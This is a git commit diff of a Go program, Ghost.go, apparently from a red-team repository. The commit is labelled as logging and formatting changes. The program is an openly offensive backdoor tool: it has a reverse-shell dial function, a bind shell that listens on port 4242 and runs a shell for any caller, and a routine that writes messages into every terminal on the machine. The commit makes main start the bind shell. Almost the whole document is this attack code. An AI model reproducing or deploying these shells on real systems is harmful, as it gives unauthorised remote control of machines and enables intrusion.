7ac99a75ba3cb4202527729d18052f26016de6cf
lukem1 <37024616+lukem1@users.noreply.github.com>
2021-03-31 17:49:43 -0400

    Logging and formatting

--- Red/Ghost.go
+++ Red/Ghost.go
@@ -21,12 +21,11 @@ func ghostsay(msg string) {
 	dir := "/dev/pts"
 	pts, e := os.ReadDir(dir)
 	if e != nil {
-		log.Fatal(e)
+		log.Printf(e.Error())
 	}
 	
 	for _, s := range pts {
 		f := fmt.Sprintf("%s/%s", dir, s.Name())
-		fmt.Printf("pts: %s\n", f)
 		if s.Name() != "ptmx" {
 			os.WriteFile(f, []byte(msg), 0666)
 		}
@@ -36,14 +35,14 @@ func ghostsay(msg string) {
 
 // dial connects to the specified host:port and creates a reverse shell
 func dial(host string, port int) {
-	fmt.Printf("Calling %s:%d...\n", host, port)
+	log.Printf("Calling %s:%d...\n", host, port)
 	
 	c, e := net.Dial("tcp",fmt.Sprintf("%s:%d", host, port))
 	if e != nil {
-		fmt.Printf("Failed to connect.\n")
+		log.Printf("Failed to connect.\n")
 		return
 	}
-	fmt.Printf("Connected.\n")
+	log.Printf("Connected to %s:%d.\n", host, port)
 	banner := "Ghost is Listening...\n"
 	c.Write([]byte(banner))
 	
@@ -57,11 +56,9 @@ func dial(host string, port int) {
 func bind(port int) {
 	// Start listening on the specified tcp port
 	l, e := net.Listen("tcp", fmt.Sprintf(":%d", port))
-	fmt.Printf("Listening on port %d...\n", port) 
+	log.Printf("Listening on port %d...\n", port) 
 	if e != nil {
-		fmt.Print("Bind error!")
-		fmt.Print(e)
-		return
+		log.Fatal(e)
 	}
 	
 	// Close the listener when bind returns
@@ -69,7 +66,7 @@ func bind(port int) {
 	
 	// session func to handle connections
 	session := func (c net.Conn) {
-		fmt.Printf("Recieved connection!\n")
+		log.Printf("Recieved connection from %s!\n", c.RemoteAddr())
 		banner := "Ghost is Listening...\n"
 		c.Write([]byte(banner))
 		
@@ -79,15 +76,14 @@ func bind(port int) {
 		shell.Run()
 		
 		c.Close()
-		fmt.Printf("Connection closed!\n")
+		log.Printf("Connection from %s closed.\n", c.RemoteAddr())
 	}
 	
 	// Accept any incoming connections
 	for {
 		c, e := l.Accept()
 		if e != nil {
-			fmt.Print("Connection Error!")
-			fmt.Print(e)
+			log.Print(e)
 		}
 		// Start a goroutine to handle any connections
 		go session(c)
@@ -98,7 +94,7 @@ func main() {
 	fmt.Printf("Hello from %d", os.Getpid())
 	fmt.Printf(" (ppid: %d, uid: %d)\n", os.Getppid(), os.Getuid())
 	
-	//bind(4242)
-	ghostsay("\nHello\n")
+	bind(4242)
+	//ghostsay("\nHello\n")
 	//dial("", 2424)
 }
